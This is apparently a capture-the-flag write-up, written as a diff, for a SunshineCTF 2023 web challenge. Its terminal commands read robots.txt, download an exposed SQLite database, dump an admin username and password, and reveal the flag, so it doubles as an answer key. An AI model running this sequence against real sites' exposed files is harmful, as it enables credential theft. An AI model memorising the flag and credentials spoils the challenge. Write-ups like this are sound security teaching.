@@ -1,0 +1,64 @@
+# Visit https://hotdog.web.2023.sunshinectf.games/robots.txt
+
+┌──(kali㉿kali)-[~/Documents/sunshinectf2023/web/hotdog-stand]
+└─$ curl -ki https://hotdog.web.2023.sunshinectf.games/robots.txt
+HTTP/2 200
+server: nginx/1.18.0 (Ubuntu)
+date: Mon, 09 Oct 2023 20:56:37 GMT
+content-type: text/html; charset=utf-8
+content-length: 81
+
+User-agent: *
+Disallow: /configs/
+Disallow: /backups/
+Disallow: /hotdog-database/
+
+# visit the /hotdog-database/ endpoint, d/l sqlite db
+# user/pass is in db
+
+# Dunno why, but curl doesn't d/l the file right:
+
+┌──(kali㉿kali)-[~/Documents/sunshinectf2023/web/hotdog-stand]
+└─$ wget --no-check-certificate https://hotdog.web.2023.sunshinectf.games/hotdog-database/
+--2023-10-09 17:07:24--  https://hotdog.web.2023.sunshinectf.games/hotdog-database/
+Resolving hotdog.web.2023.sunshinectf.games (hotdog.web.2023.sunshinectf.games)... 34.132.254.90
+Connecting to hotdog.web.2023.sunshinectf.games (hotdog.web.2023.sunshinectf.games)|34.132.254.90|:443... connected.
+WARNING: The certificate of ‘hotdog.web.2023.sunshinectf.games’ is not trusted.
+WARNING: The certificate of ‘hotdog.web.2023.sunshinectf.games’ doesn't have a known issuer.
+HTTP request sent, awaiting response... 200 OK
+Length: 24576 (24K) [application/octet-stream]
+Saving to: ‘index.html’
+
+index.html                  100%[=========================================>]  24.00K  --.-KB/s    in 0s
+
+2023-10-09 17:07:25 (55.3 MB/s) - ‘index.html’ saved [24576/24576]
+
+┌──(kali㉿kali)-[~/Documents/sunshinectf2023/web/hotdog-stand]
+└─$ file index.html
+index.html: SQLite 3.x database, last written using SQLite version 3041002, file counter 21, database pages 6, cookie 0x4, schema 4, UTF-8, version-valid-for 21
+
+┌──(kali㉿kali)-[~/Documents/sunshinectf2023/web/hotdog-stand]
+└─$ mv index.html data.db
+
+┌──(kali㉿kali)-[~/Documents/sunshinectf2023/web/hotdog-stand]
+└─$ sqlite3 data.db '.tables'
+credentials       customer_reviews  menu_items        robot_logs
+
+┌──(kali㉿kali)-[~/Documents/sunshinectf2023/web/hotdog-stand]
+└─$ sqlite3 data.db '.schema credentials'
+CREATE TABLE credentials(
+   id INTEGER PRIMARY KEY AUTOINCREMENT,
+   username TEXT NOT NULL,
+   password TEXT NOT NULL,
+   role TEXT
+);
+
+┌──(kali㉿kali)-[~/Documents/sunshinectf2023/web/hotdog-stand]
+└─$ sqlite3 data.db 'select * from credentials;'
+1|hotdogstand|slicedpicklesandonions|admin
+
+username/password to login to app, flag is shown:
+
+# Please take your authentication token: sun{5l1c3d_p1cKl35_4nd_0N10N2}
+
+
